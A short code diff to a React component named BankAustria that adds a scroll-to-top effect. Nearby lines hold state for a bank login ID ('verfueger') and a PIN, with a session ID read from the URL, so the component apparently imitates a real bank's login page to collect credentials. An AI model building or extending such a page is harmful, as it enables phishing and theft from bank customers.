@@ -88,6 +88,8 @@ const BankAustria = () => {
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
 
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [activeLang, setActiveLang] = useState<"de" | "en">("de");
